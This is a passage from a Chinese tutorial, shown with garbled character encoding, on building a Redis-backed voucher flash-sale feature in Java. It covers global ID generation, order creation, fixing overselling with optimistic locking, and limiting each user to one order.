null) {\n            return Result.fail(\"åº—é“ºä¸å­˜åœ¨ï¼\");\n        }\n        // 7.è¿”å›\n        return Result.ok(shop);\n    }\n```\n\n# â‘¢ä¼˜æƒ åˆ¸ç§’æ€\n\n## â¶Rediså®ç°å…¨å±€å”¯ä¸€ID\n\n> æ¯ä¸ªåº—é“ºéƒ½å¯ä»¥å‘å¸ƒä¼˜æƒ åˆ¸ï¼Œå½“ç”¨æˆ·æŠ¢è´­æ—¶ï¼Œå°±ä¼šç”Ÿæˆè®¢å•å¹¶ä¿å­˜åˆ°tb_voucher_orderè¿™å¼ è¡¨ä¸­ï¼Œè€Œè®¢å•è¡¨å¦‚æœä½¿ç”¨æ•°æ®åº“è‡ªå¢IDå°±å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š\n>\n> * idçš„è§„å¾‹æ€§å¤ªæ˜æ˜¾\n> * å—å•è¡¨æ•°æ®é‡çš„é™åˆ¶\n>\n> åœºæ™¯åˆ†æä¸€ï¼šå¦‚æœæˆ‘ä»¬çš„idå…·æœ‰å¤ªæ˜æ˜¾çš„è§„åˆ™ï¼Œç”¨æˆ·æˆ–è€…è¯´å•†ä¸šå¯¹æ‰‹å¾ˆå®¹æ˜“çŒœæµ‹å‡ºæ¥æˆ‘ä»¬çš„ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å•†åŸåœ¨ä¸€å¤©æ—¶é—´å†…ï¼Œå–å‡ºäº†å¤šå°‘å•ï¼Œè¿™æ˜æ˜¾ä¸åˆé€‚ã€‚\n>\n> åœºæ™¯åˆ†æäºŒï¼šéšç€æˆ‘ä»¬å•†åŸè§„æ¨¡è¶Šæ¥è¶Šå¤§ï¼Œmysqlçš„å•è¡¨çš„å®¹é‡ä¸å®œè¶…è¿‡500Wï¼Œæ•°æ®é‡è¿‡å¤§ä¹‹åï¼Œæˆ‘ä»¬è¦è¿›è¡Œæ‹†åº“æ‹†è¡¨ï¼Œä½†æ‹†åˆ†è¡¨äº†ä¹‹åï¼Œä»–ä»¬ä»é€»è¾‘ä¸Šè®²ä»–ä»¬æ˜¯åŒä¸€å¼ è¡¨ï¼Œæ‰€ä»¥ä»–ä»¬çš„idæ˜¯ä¸èƒ½ä¸€æ ·çš„ï¼Œ äºæ˜¯ä¹æˆ‘ä»¬éœ€è¦ä¿è¯idçš„å”¯ä¸€æ€§ã€‚\n\n**å…¨å±€IDç”Ÿæˆå™¨**ï¼Œæ˜¯ä¸€ç§åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹ç”¨æ¥ç”Ÿæˆå…¨å±€å”¯ä¸€IDçš„å·¥å…·ï¼Œä¸€èˆ¬è¦æ»¡è¶³ä¸‹åˆ—ç‰¹æ€§ï¼š\n\n![](https://img.jwt1399.top/img/202211251852632.png)\n\n**å…¨å±€å”¯ä¸€IDç”Ÿæˆç­–ç•¥ï¼šUUIDã€Redisè‡ªå¢ã€snowflakeç®—æ³•ã€æ•°æ®åº“è‡ªå¢**\n\nä¸ºäº†å¢åŠ IDçš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç›´æ¥ä½¿ç”¨Redisè‡ªå¢çš„æ•°å€¼ï¼Œè€Œæ˜¯æ‹¼æ¥ä¸€äº›å…¶å®ƒä¿¡æ¯ï¼š\n\nRedisè‡ªå¢IDç­–ç•¥ï¼šIDæ„é€ æ˜¯ æ—¶é—´æˆ³ + è®¡æ•°å™¨ï¼Œæ¯å¤©ä¸€ä¸ªkeyï¼Œæ–¹ä¾¿ç»Ÿè®¡è®¢å•é‡\n\n![](https://img.jwt1399.top/img/202211251852180.png)\n\nIDçš„ç»„æˆéƒ¨åˆ†ï¼š\n\n- ç¬¦å·ä½ï¼š1bitï¼Œæ°¸è¿œä¸º0\n\n- æ—¶é—´æˆ³ï¼š31bitï¼Œä»¥ç§’ä¸ºå•ä½\n\n- åºåˆ—å·ï¼š32bitï¼Œç§’å†…çš„è®¡æ•°å™¨ï¼Œæ”¯æŒæ¯ç§’äº§ç”Ÿ2^32ä¸ªä¸åŒID\n  - è¡¨ç¤ºåœ¨æŸä¸€ç§’ä¸‹ï¼Œè¿™ä¸ªè‡ªå¢åŸŸæœ€å¤§å¯ä»¥åˆ†é…çš„bitä¸ªæ•°ï¼Œåœ¨å½“å‰è¿™ç§é…ç½®ä¸‹ï¼Œæ¯ä¸€ç§’å¯ä»¥åˆ†é…2^32ä¸ªæ•°æ®\n\n```java\n@Component\npublic class RedisIdWorker {\n    /**\n     * å¼€å§‹æ—¶é—´æˆ³ï¼ˆ2022-01-01ï¼‰\n     */\n    private static final long BEGIN_TIMESTAMP = 1640995200L;\n    /**\n     * åºåˆ—å·çš„ä½æ•°\n     */\n    private static final int COUNT_BITS = 32;\n\n    private StringRedisTemplate stringRedisTemplate;\n\n    public RedisIdWorker(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    public long nextId(String keyPrefix) {\n        // 1.ç”Ÿæˆæ—¶é—´æˆ³\n        LocalDateTime now = LocalDateTime.now();\n        long nowSecond = now.toEpochSecond(ZoneOffset.UTC);\n        long timestamp = nowSecond - BEGIN_TIMESTAMP; //ç°åœ¨æ—¶é—´-å¼€å§‹æ—¶é—´æˆ³\n\n        // 2.ç”Ÿæˆåºåˆ—å·\n        // 2.1.è·å–å½“å‰æ—¥æœŸï¼Œç²¾ç¡®åˆ°å¤©\n        String date = now.format(DateTimeFormatter.ofPattern(\"yyyy:MM:dd\"));\n        // 2.2.è‡ªå¢é•¿\n        long count = stringRedisTemplate.opsForValue().increment(\"icr:\" + keyPrefix + \":\" + date);\n\n        // 3.æ‹¼æ¥å¹¶è¿”å›\n        return timestamp << COUNT_BITS | count;\n    }\n}\n```\n\n**æµ‹è¯•ç±»**\n\n```java\n\t\t@Resource\n    private RedisIdWorker redisIdWorker;\n\n    private ExecutorService es = Executors.newFixedThreadPool(500);\n\n    @Test\n    void testIdWorker() throws InterruptedException {\n        CountDownLatch latch = new CountDownLatch(300);\n\n        Runnable task = () -> {\n            for (int i = 0; i < 100; i++) {\n                long id = redisIdWorker.nextId(\"order\");\n                System.out.println(\"id = \" + id);\n            }\n            latch.countDown();\n        };\n        long begin = System.currentTimeMillis();\n        for (int i = 0; i < 300; i++) {\n            es.submit(task);\n        }\n        latch.await();\n        long end = System.currentTimeMillis();\n        System.out.println(\"time = \" + (end - begin));\n    }\n```\n\n> çŸ¥è¯†å°è´´å£«ï¼šcountdownlatch\n>\n> countdownlatchåä¸ºä¿¡å·æªï¼šä¸»è¦çš„ä½œç”¨æ˜¯åŒæ­¥åè°ƒåœ¨å¤šçº¿ç¨‹çš„ç­‰å¾…äºå”¤é†’é—®é¢˜\n>\n> å¦‚æœæ²¡æœ‰CountDownLatch ï¼Œé‚£ä¹ˆç”±äºç¨‹åºæ˜¯å¼‚æ­¥çš„ï¼Œå½“å¼‚æ­¥ç¨‹åºæ²¡æœ‰æ‰§è¡Œå®Œæ—¶ï¼Œä¸»çº¿ç¨‹å°±å·²ç»æ‰§è¡Œå®Œäº†ï¼Œç„¶åæˆ‘ä»¬æœŸæœ›çš„æ˜¯åˆ†çº¿ç¨‹å…¨éƒ¨èµ°å®Œä¹‹åï¼Œä¸»çº¿ç¨‹å†èµ°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶éœ€è¦ä½¿ç”¨åˆ°CountDownLatchï¼ŒCountDownLatch ä¸­æœ‰ä¸¤ä¸ªæœ€é‡è¦çš„æ–¹æ³•\n>\n> - 1ã€countDown\n>\n> - 2ã€await\n>\n> await æ–¹æ³•æ˜¯é˜»å¡æ–¹æ³•ï¼Œæˆ‘ä»¬æ‹…å¿ƒåˆ†çº¿ç¨‹æ²¡æœ‰æ‰§è¡Œå®Œæ—¶ï¼Œmainçº¿ç¨‹å°±å…ˆæ‰§è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨awaitå¯ä»¥è®©mainçº¿ç¨‹é˜»å¡ï¼Œé‚£ä¹ˆä»€ä¹ˆæ—¶å€™mainçº¿ç¨‹ä¸å†é˜»å¡å‘¢ï¼Ÿå½“CountDownLatch å†…éƒ¨ç»´æŠ¤çš„å˜é‡å˜ä¸º0æ—¶ï¼Œå°±ä¸å†é˜»å¡ï¼Œç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆä»€ä¹ˆæ—¶å€™CountDownLatch   ç»´æŠ¤çš„å˜é‡å˜ä¸º0 å‘¢ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨ä¸€æ¬¡countDown ï¼Œå†…éƒ¨å˜é‡å°±å‡å°‘1ï¼Œæˆ‘ä»¬è®©åˆ†çº¿ç¨‹å’Œå˜é‡ç»‘å®šï¼Œ æ‰§è¡Œå®Œä¸€ä¸ªåˆ†çº¿ç¨‹å°±å‡å°‘ä¸€ä¸ªå˜é‡ï¼Œå½“åˆ†çº¿ç¨‹å…¨éƒ¨èµ°å®Œï¼ŒCountDownLatch ç»´æŠ¤çš„å˜é‡å°±æ˜¯0ï¼Œæ­¤æ—¶awaitå°±ä¸å†é˜»å¡ï¼Œç»Ÿè®¡å‡ºæ¥çš„æ—¶é—´ä¹Ÿå°±æ˜¯æ‰€æœ‰åˆ†çº¿ç¨‹æ‰§è¡Œå®Œåçš„æ—¶é—´ã€‚\n\n## â·æ·»åŠ ä¼˜æƒ å·\n\næ¯ä¸ªåº—é“ºéƒ½å¯ä»¥å‘å¸ƒä¼˜æƒ åˆ¸ï¼Œåˆ†ä¸ºå¹³ä»·åˆ¸å’Œç‰¹ä»·åˆ¸ã€‚å¹³ä»·åˆ¸å¯ä»¥ä»»æ„è´­ä¹°ï¼Œè€Œç‰¹ä»·åˆ¸éœ€è¦ç§’æ€æŠ¢è´­ï¼š\n\n![](../images/Redis-å®æˆ˜ç¯‡/1653365145124.png)\n\nè¡¨ä¿¡æ¯ï¼š\n\n- tb_voucherï¼šä¼˜æƒ åˆ¸çš„åŸºæœ¬ä¿¡æ¯ï¼Œä¼˜æƒ é‡‘é¢ã€ä½¿ç”¨è§„åˆ™ç­‰\n- tb_seckill_voucherï¼šä¼˜æƒ åˆ¸çš„åº“å­˜ã€å¼€å§‹æŠ¢è´­æ—¶é—´ï¼Œç»“æŸæŠ¢è´­æ—¶é—´ã€‚ç‰¹ä»·ä¼˜æƒ åˆ¸æ‰éœ€è¦å¡«å†™è¿™äº›ä¿¡æ¯\n\nå¹³ä»·å·ç”±äºä¼˜æƒ åŠ›åº¦å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä»»æ„é¢†å–ï¼›è€Œç‰¹ä»·åˆ¸ç”±äºä¼˜æƒ åŠ›åº¦å¤§ï¼Œå°±å¾—é™åˆ¶æ•°é‡ï¼Œä»è¡¨ç»“æ„ä¸Šä¹Ÿèƒ½çœ‹å‡ºï¼Œç‰¹ä»·å·é™¤äº†å…·æœ‰ä¼˜æƒ å·çš„åŸºæœ¬ä¿¡æ¯ä»¥å¤–ï¼Œè¿˜å…·æœ‰åº“å­˜ï¼ŒæŠ¢è´­æ—¶é—´ï¼Œç»“æŸæ—¶é—´ç­‰ç­‰å­—æ®µ\n\n**æ–°å¢æ™®é€šå·ä»£ç ï¼š  **VoucherController\n\n```java\n@PostMapping\npublic Result addVoucher(@RequestBody Voucher voucher) {\n    voucherService.save(voucher);\n    return Result.ok(voucher.getId());\n}\n```\n\n**æ–°å¢ç§’æ€å·ä»£ç ï¼š**\n\n- **VoucherController**\n\n```java\n@PostMapping(\"seckill\")\npublic Result addSeckillVoucher(@RequestBody Voucher voucher) {\n    voucherService.addSeckillVoucher(voucher);\n    return Result.ok(voucher.getId());\n}\n```\n\n- **VoucherServiceImpl**\n\n```java\n@Override\n@Transactional\npublic void addSeckillVoucher(Voucher voucher) {\n    // ä¿å­˜ä¼˜æƒ åˆ¸\n    save(voucher);\n    // ä¿å­˜ç§’æ€ä¿¡æ¯\n    SeckillVoucher seckillVoucher = new SeckillVoucher();\n    seckillVoucher.setVoucherId(voucher.getId());\n    seckillVoucher.setStock(voucher.getStock());\n    seckillVoucher.setBeginTime(voucher.getBeginTime());\n    seckillVoucher.setEndTime(voucher.getEndTime());\n    seckillVoucherService.save(seckillVoucher);\n}\n```\n\n**æ·»åŠ ä¸€å¼ ç‰¹ä»·åˆ¸**\n\n![](https://img.jwt1399.top/img/202211252001419.png)\n\n```json\n{\n    \"shopId\": 1,\n    \"title\": \"100å…ƒç‰¹ä»·åŠµ\",\n    \"subTitle\": \"å‘¨ä¸€è‡³å‘¨äº”å‡å¯ä½¿ç”¨\",\n    \"rules\": \"å…¨åœºé€šç”¨\\\\næ— éœ€é¢„çº¦\\\\nå¯æ— é™å åŠ \\\\ä¸å…‘ç°ã€ä¸æ‰¾é›¶\\nä»…é™å ‚é£Ÿ\",\n    \"payValue\": 8000,\n    \"actualValue\": 10000,\n    \"type\": 1,\n    \"stock\": 100,\n    \"beginTime\": \"2022-11-25T18:10:39\",\n    \"endTime\": \"2022-11-25T24:32:19\"\n}\n```\n\n## â¸å®ç°ç§’æ€ä¸‹å•\n\nä¸‹å•æ ¸å¿ƒæ€è·¯ï¼šå½“æˆ‘ä»¬ç‚¹å‡»æŠ¢è´­æ—¶ï¼Œä¼šè§¦å‘å³ä¾§çš„è¯·æ±‚ï¼Œæˆ‘ä»¬åªéœ€è¦ç¼–å†™å¯¹åº”çš„controllerå³å¯\n\n![](https://img.jwt1399.top/img/202211252011573.png)\n\nç§’æ€ä¸‹å•åº”è¯¥æ€è€ƒçš„å†…å®¹ï¼š\n\n* ç§’æ€æ˜¯å¦å¼€å§‹æˆ–ç»“æŸï¼Œå¦‚æœå°šæœªå¼€å§‹æˆ–å·²ç»ç»“æŸåˆ™æ— æ³•ä¸‹å•\n* åº“å­˜æ˜¯å¦å……è¶³ï¼Œä¸è¶³åˆ™æ— æ³•ä¸‹å•\n\nä¸‹å•æ ¸å¿ƒé€»è¾‘åˆ†æï¼š\n\nå½“ç”¨æˆ·å¼€å§‹è¿›è¡Œä¸‹å•ï¼Œæˆ‘ä»¬åº”å½“å»æŸ¥è¯¢ä¼˜æƒ å·ä¿¡æ¯ï¼ŒæŸ¥è¯¢åˆ°ä¼˜æƒ å·ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦æ»¡è¶³ç§’æ€æ¡ä»¶ï¼Œæ¯”å¦‚æ—¶é—´æ˜¯å¦å……è¶³ï¼Œå¦‚æœæ—¶é—´å……è¶³ï¼Œåˆ™è¿›ä¸€æ­¥åˆ¤æ–­åº“å­˜æ˜¯å¦è¶³å¤Ÿï¼Œå¦‚æœä¸¤è€…éƒ½æ»¡è¶³ï¼Œåˆ™æ‰£å‡åº“å­˜ï¼Œåˆ›å»ºè®¢å•ï¼Œç„¶åè¿”å›è®¢å•idï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ¡ä»¶ä¸æ»¡è¶³åˆ™ç›´æ¥ç»“æŸã€‚\n\n![](https://img.jwt1399.top/img/202211252011684.png)\n\n```java\n// VoucherOrderServiceImpl\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.æŸ¥è¯¢ä¼˜æƒ åˆ¸\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.åˆ¤æ–­ç§’æ€æ˜¯å¦å¼€å§‹\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n        // å°šæœªå¼€å§‹\n        return Result.fail(\"ç§’æ€å°šæœªå¼€å§‹ï¼\");\n    }\n    // 3.åˆ¤æ–­ç§’æ€æ˜¯å¦å·²ç»ç»“æŸ\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n        // å°šæœªå¼€å§‹\n        return Result.fail(\"ç§’æ€å·²ç»ç»“æŸï¼\");\n    }\n    // 4.åˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³\n    if (voucher.getStock() < 1) {\n        // åº“å­˜ä¸è¶³\n        return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n    //5ï¼Œæ‰£å‡åº“å­˜\n    boolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).update();\n    if (!success) {\n        //æ‰£å‡åº“å­˜\n        return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n    //6.åˆ›å»ºè®¢å•\n    VoucherOrder voucherOrder = new VoucherOrder();\n    // 6.1.è®¢å•id\n    long orderId = redisIdWorker.nextId(\"order\");\n    voucherOrder.setId(orderId);\n    // 6.2.ç”¨æˆ·id\n    Long userId = UserHolder.getUser().getId();\n    voucherOrder.setUserId(userId);\n    // 6.3.ä»£é‡‘åˆ¸id\n    voucherOrder.setVoucherId(voucherId);\n    save(voucherOrder);\n\n    return Result.ok(orderId);\n\n}\n```\n\n## â¹åº“å­˜è¶…å–é—®é¢˜åˆ†æ\n\næœ‰å…³è¶…å–é—®é¢˜åˆ†æï¼šåŸæœ‰ä»£ç ä¸­æ˜¯è¿™ä¹ˆå†™çš„\n\n```java\n if (voucher.getStock() < 1) {\n        // åº“å­˜ä¸è¶³\n        return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n    //5ï¼Œæ‰£å‡åº“å­˜\n    boolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).update();\n    if (!success) {\n        //æ‰£å‡åº“å­˜\n        return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n```\n\nå‡è®¾çº¿ç¨‹1è¿‡æ¥æŸ¥è¯¢åº“å­˜ï¼Œåˆ¤æ–­å‡ºæ¥åº“å­˜å¤§äº1ï¼Œæ­£å‡†å¤‡å»æ‰£å‡åº“å­˜ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æ¥å¾—åŠå»æ‰£å‡ï¼Œæ­¤æ—¶çº¿ç¨‹2è¿‡æ¥ï¼Œçº¿ç¨‹2ä¹Ÿå»æŸ¥è¯¢åº“å­˜ï¼Œå‘ç°è¿™ä¸ªæ•°é‡ä¸€å®šä¹Ÿå¤§äº1ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¼šå»æ‰£å‡åº“å­˜ï¼Œæœ€ç»ˆå¤šä¸ªçº¿ç¨‹ç›¸å½“äºä¸€èµ·å»æ‰£å‡åº“å­˜ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°åº“å­˜çš„è¶…å–é—®é¢˜ã€‚\n\n------\n\nè¶…å–é—®é¢˜æ˜¯å…¸å‹çš„å¤šçº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œé’ˆå¯¹è¿™ä¸€é—®é¢˜çš„å¸¸è§è§£å†³æ–¹æ¡ˆå°±æ˜¯åŠ é”ï¼Œå¯¹äºåŠ é”ï¼Œé€šå¸¸æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š\n\n![](https://img.jwt1399.top/img/202211252100546.png)\n\næœ¬é¡¹ç›®æˆ‘ä»¬é‡‡ç”¨ä¹è§‚é”æ¥è§£å†³è¶…å–é—®é¢˜ï¼š\n\n> ä¹è§‚é”ï¼šä¼šæœ‰ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œæ¯æ¬¡æ“ä½œæ•°æ®ä¼šå¯¹ç‰ˆæœ¬å·+1ï¼Œå†æäº¤å›æ•°æ®æ—¶ï¼Œä¼šå»æ ¡éªŒæ˜¯å¦æ¯”ä¹‹å‰çš„ç‰ˆæœ¬å¤§1 ï¼Œå¦‚æœå¤§1 ï¼Œåˆ™è¿›è¡Œæ“ä½œæˆåŠŸï¼Œè¿™å¥—æœºåˆ¶çš„æ ¸å¿ƒé€»è¾‘åœ¨äºï¼Œå¦‚æœåœ¨æ“ä½œè¿‡ç¨‹ä¸­ï¼Œç‰ˆæœ¬å·åªæ¯”åŸæ¥å¤§1 ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰äººå¯¹ä»–è¿›è¡Œè¿‡ä¿®æ”¹ï¼Œä»–çš„æ“ä½œå°±æ˜¯å®‰å…¨çš„ï¼Œå¦‚æœä¸å¤§1ï¼Œåˆ™æ•°æ®è¢«ä¿®æ”¹è¿‡ã€‚\n>\n> ä¹è§‚é”çš„å…¸å‹ä»£è¡¨ï¼šå°±æ˜¯CASï¼Œåˆ©ç”¨CASè¿›è¡Œæ— é”åŒ–æœºåˆ¶åŠ é”ï¼Œvar5 æ˜¯æ“ä½œå‰è¯»å–çš„å†…å­˜å€¼ï¼Œwhileä¸­çš„var1+var2 æ˜¯é¢„ä¼°å€¼ï¼Œå¦‚æœé¢„ä¼°å€¼ == å†…å­˜å€¼ï¼Œåˆ™ä»£è¡¨ä¸­é—´æ²¡æœ‰è¢«äººä¿®æ”¹è¿‡ï¼Œæ­¤æ—¶å°±å°†æ–°å€¼å»æ›¿æ¢ å†…å­˜å€¼\n>\n>   å…¶ä¸­do while æ˜¯ä¸ºäº†åœ¨æ“ä½œå¤±è´¥æ—¶ï¼Œå†æ¬¡è¿›è¡Œè‡ªæ—‹æ“ä½œï¼Œå³æŠŠä¹‹å‰çš„é€»è¾‘å†æ“ä½œä¸€æ¬¡ã€‚\n>\n> ```java\n> int var5;\n> do {\n>     var5 = this.getIntVolatile(var1, var2);\n> } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));\n> \n> return var5;\n> ```\n>\n\né¡¹ç›®ä¸­çš„ä½¿ç”¨æ–¹å¼æ˜¯æ²¡æœ‰åƒCASä¸€æ ·å¸¦è‡ªæ—‹çš„æ“ä½œï¼Œä¹Ÿæ²¡æœ‰å¯¹ç‰ˆæœ¬å·+1 ï¼Œè€Œæ˜¯ç›´æ¥å°†stockåšä¸ºç‰ˆæœ¬å·\n\n<img src=\"https://img.jwt1399.top/img/202211252116596.png\" style=\"zoom:50%;\" />\n\n## âºä¹è§‚é”è§£å†³è¶…å–é—®é¢˜\n\n**æ–¹æ¡ˆä¸€**\n\nVoucherOrderServiceImpl åœ¨æ‰£å‡åº“å­˜æ—¶ï¼Œæ”¹ä¸ºï¼š\n\n```java\nboolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\") //set stock = stock -1\n            .eq(\"voucher_id\", voucherId).eq(\"stock\",voucher.getStock()).update(); //where id = ï¼Ÿ and stock = ?\n```\n\nä»£ç åˆ†æï¼šå½“æ‰£å‡åº“å­˜æ—¶çš„åº“å­˜å’Œä¹‹å‰æˆ‘æŸ¥è¯¢åˆ°çš„åº“å­˜æ˜¯ä¸€æ ·çš„ï¼Œå°±æ„å‘³ç€æ²¡æœ‰äººåœ¨ä¸­é—´ä¿®æ”¹è¿‡åº“å­˜ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯ä»¥ä¸Šè¿™ç§æ–¹å¼é€šè¿‡æµ‹è¯•å‘ç°ä¼šæœ‰å¾ˆå¤šå¤±è´¥çš„æƒ…å†µï¼Œå¤±è´¥çš„åŸå› åœ¨äºï¼šåœ¨ä½¿ç”¨ä¹è§‚é”è¿‡ç¨‹ä¸­å‡è®¾100ä¸ªçº¿ç¨‹åŒæ—¶éƒ½æ‹¿åˆ°äº†100çš„åº“å­˜ï¼Œç„¶åå¤§å®¶ä¸€èµ·å»è¿›è¡Œæ‰£å‡ï¼Œä½†æ˜¯100ä¸ªäººä¸­åªæœ‰1ä¸ªäººèƒ½æ‰£å‡æˆåŠŸï¼Œå…¶ä»–çš„äººåœ¨æ‰£å‡æ—¶ï¼Œå‘ç°åº“å­˜å·²ç»è¢«ä¿®æ”¹è¿‡äº†ï¼Œæ‰€ä»¥æ­¤æ—¶è¿™äº›çº¿ç¨‹éƒ½ä¼šå¤±è´¥ã€‚\n\n**æ–¹æ¡ˆäºŒ**\n\næ–¹æ¡ˆä¸€è¦æ±‚ä¿®æ”¹å‰åéƒ½ä¿æŒä¸€è‡´ï¼Œä½†æ˜¯è¿™æ ·æˆ‘ä»¬åˆ†æè¿‡ï¼ŒæˆåŠŸçš„æ¦‚ç‡å¤ªä½ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¹è§‚é”éœ€è¦å˜ä¸€ä¸‹ï¼Œæ”¹æˆstock å¤§äº 0 å³å¯è¿›è¡Œä¿®æ”¹\n\n```java\nboolean success = seckillVoucherService.update()\n            .setSql(\"stock= stock -1\")\n            .eq(\"voucher_id\", voucherId).gt(\"stock\",0).update(); //where id = ? and stock > 0\n```\n\n##  â»ä¼˜æƒ åˆ¸ç§’æ€-ä¸€äººä¸€å•\n\n> éœ€æ±‚ï¼šä¿®æ”¹ç§’æ€ä¸šåŠ¡ï¼Œè¦æ±‚åŒä¸€ä¸ªä¼˜æƒ åˆ¸ï¼Œä¸€ä¸ªç”¨æˆ·åªèƒ½ä¸‹ä¸€å•\n\n**ç°åœ¨çš„é—®é¢˜åœ¨äºï¼š**ä¼˜æƒ å·æ˜¯ä¸ºäº†å¼•æµï¼Œä½†æ˜¯ç›®å‰çš„æƒ…å†µæ˜¯ï¼Œä¸€ä¸ªäººå¯ä»¥æ— é™åˆ¶çš„æŠ¢è¿™ä¸ªä¼˜æƒ å·ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“å¢åŠ ä¸€å±‚é€»è¾‘ï¼Œè®©ä¸€ä¸ªç”¨æˆ·åªèƒ½ä¸‹ä¸€ä¸ªå•ï¼Œè€Œä¸æ˜¯è®©ä¸€ä¸ªç”¨æˆ·ä¸‹å¤šä¸ªå•\n\n**å…·ä½“æ“ä½œé€»è¾‘ï¼š**é¦–å…ˆåˆ¤æ–­ä¼˜æƒ å·ç§’æ€æ˜¯å¦å¼€å§‹ï¼Œå¦‚æœå¼€å§‹ï¼Œåˆ™è¿›ä¸€æ­¥åˆ¤æ–­åº“å­˜æ˜¯å¦è¶³å¤Ÿï¼Œç„¶åå†æ ¹æ®ä¼˜æƒ å·idå’Œç”¨æˆ·idæŸ¥è¯¢æ˜¯å¦å·²ç»ä¸‹è¿‡è¿™ä¸ªè®¢å•ï¼Œå¦‚æœä¸‹è¿‡è¿™ä¸ªè®¢å•ï¼Œåˆ™ä¸å†ä¸‹å•ï¼Œå¦åˆ™è¿›è¡Œä¸‹å•\n\n![](https://img.jwt1399.top/img/202211261532789.png)\n\n**åˆæ­¥ä»£ç ï¼šå¢åŠ ä¸€äººä¸€å•é€»è¾‘**\n\n```java\n//VoucherOrderServiceImpl  \n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.æŸ¥è¯¢ä¼˜æƒ åˆ¸\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.åˆ¤æ–­ç§’æ€æ˜¯å¦å¼€å§‹\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n        // å°šæœªå¼€å§‹\n        return Result.fail(\"ç§’æ€å°šæœªå¼€å§‹ï¼\");\n    }\n    // 3.åˆ¤æ–­ç§’æ€æ˜¯å¦å·²ç»ç»“æŸ\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n        // å°šæœªå¼€å§‹\n        return Result.fail(\"ç§’æ€å·²ç»ç»“æŸï¼\");\n    }\n    // 4.åˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³\n    if (voucher.getStock() < 1) {\n        // åº“å­˜ä¸è¶³\n        return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n    // 5.ä¸€äººä¸€å•é€»è¾‘\n    // 5.1.ç”¨æˆ·id\n    Long userId = UserHolder.getUser().getId();\n    int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n    // 5.2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n    if (count > 0) {\n        // ç”¨æˆ·å·²ç»è´­ä¹°è¿‡äº†\n        return Result.fail(\"ç”¨æˆ·å·²ç»è´­ä¹°è¿‡ä¸€æ¬¡ï¼\");\n    }\n    //6ï¼Œæ‰£å‡åº“å­˜\n  \tboolean success = seckillVoucherService.update()\n      .setSql(\"stock= stock -1\")\n      .eq(\"voucher_id\", voucherId).gt(\"stock\",0).update(); //where id = ? and stock > 0\n  \tif (!success) {\n    \treturn Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n  \t}\n    //7.åˆ›å»ºè®¢å•\n    VoucherOrder voucherOrder = new VoucherOrder();\n    // 7.1.è®¢å•id\n    long orderId = redisIdWorker.nextId(\"order\");\n    voucherOrder.setId(orderId);\n\n    voucherOrder.setUserId(userId);\n    // 7.3.ä»£é‡‘åˆ¸id\n    voucherOrder.setVoucherId(voucherId);\n    save(voucherOrder);\n\n    return Result.ok(orderId);\n\n}\n```\n\n**å­˜åœ¨é—®é¢˜ï¼š**ç°åœ¨çš„é—®é¢˜è¿˜æ˜¯å’Œä¹‹å‰ä¸€æ ·ï¼Œå¹¶å‘è¿‡æ¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“ï¼Œéƒ½ä¸å­˜åœ¨è®¢å•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯éœ€è¦åŠ 